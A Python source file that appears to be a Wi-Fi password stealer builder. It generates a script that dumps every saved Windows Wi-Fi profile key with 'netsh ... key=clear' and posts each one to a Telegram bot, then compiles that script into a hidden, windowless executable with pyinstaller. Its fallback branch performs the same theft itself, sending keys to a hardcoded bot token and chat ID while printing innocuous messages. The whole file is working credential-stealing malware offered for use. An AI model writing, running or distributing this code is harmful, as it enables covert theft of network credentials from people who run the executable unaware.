from colorama import Fore,Back,Style
import subprocess
import requests
import sys
import os


import banner 
ask = input("Do you want to create your script🤔 (y/n): ").lower()

if ask == "yes" or ask == "y":

# Get id & token Telegram_bot
    print("\n     Wellcome to your Script! ")
    BotId = input("Enter your Chat ID: ")
    BotToken = input("Enter your bot token: ")

    

# create script file    
    def create_script_file():
            with open("script.py", "w") as file:
            
    # Import libraries  
                file.write("""# Export File
import subprocess
import requests
import sys
import os\n\n""")

    # Create id & token variables
                file.write("# id & token Telegram_bot\n")
                file.write('id = "')
                file.write((BotId))
                file.write('"\n')
                file.write('token = "')
                file.write((BotToken))
                file.write('"')

    # Wifi Function
                file.write("""

# Wifi Detils...
def wifi():

            
# Show profile & remove some unimportant text
    show_profile = subprocess.getoutput("netsh wlan show profile")
    remove_sometings = show_profile.replace("Profiles on interface Wi-Fi:","").replace("Group policy profiles (read only)","").replace("---------------------------------","").replace("<None>","").replace("\\n","").replace("User profiles","").replace("-------------","").replace("All User Profile","").replace(":","").replace("              ", "")
    show_profile = remove_sometings.split("          ")

# Loop for every profile name
    for i in show_profile:
        key = subprocess.getoutput(f"netsh wlan show profile \"{i}\" key=clear")
                        
# Send data to Telegram_bot
        url = "https://api.telegram.org/bot{}/sendMessage".format(token)
        params = {
            "chat_id": id,
            "text": key
                }
        req = requests.post(url, json=params)
                        
        if req.status_code == 200:
            print("System information sent successfully")
        else:
          print("Error sending message:", req.status_code, req.text)
        
wifi()\n""")

    create_script_file()

# Export EXE file
    def export_exe():
    
    # Build the command for pyinstaller
        subprocess.run("pyinstaller --onefile --noconsole --hidden-import requests script.py")
        print("Your exe file has been created!")
        
    export_exe()
    # Send Text this is for test
    msg = "Your Script is done!"
    url = ("https://api.telegram.org/bot"+BotToken+"/sendMessage?chat_id="+BotId+"&text="+msg)
    req = requests.post(url, data={"chat_id": id, "text": msg})
    
else:

# MyWifi Detils...
    def MyWifi():
    
    # show profile & remove some not importent text
        show_profile = subprocess.getoutput("netsh wlan show profile")
        remove_sometings = show_profile.replace("Profiles on interface Wi-Fi:","").replace("Group policy profiles (read only)","").replace("---------------------------------","").replace("<None>","").replace("\n","").replace("User profiles","").replace("-------------","").replace("All User Profile","").replace(":","").replace("              ", "")
        show_profile = remove_sometings.split("          ")

    # for_loops for every time run with different profile name
        for i in show_profile:
            key = subprocess.getoutput(f"netsh wlan show profile \"{i}\" key=clear")
            # print(key)

        # set token & id Telegram_bot in blank places 
            url = ("https://api.telegram.org/bot7171379416:AAEbyJBW2_uzfrnHgw2eQg1QB_3EN3SFzGA/sendMessage?chat_id=1818902368&text={}".format(key))
            req = requests.post(url, data={"chat_id": 1818902368, "text": key})
            if req.status_code == 200:
                print("OK please Wait...")
            else:
                print("Error: ", req.status_code, req.text)
        print("Thanks  ^_~ ")

    MyWifi()
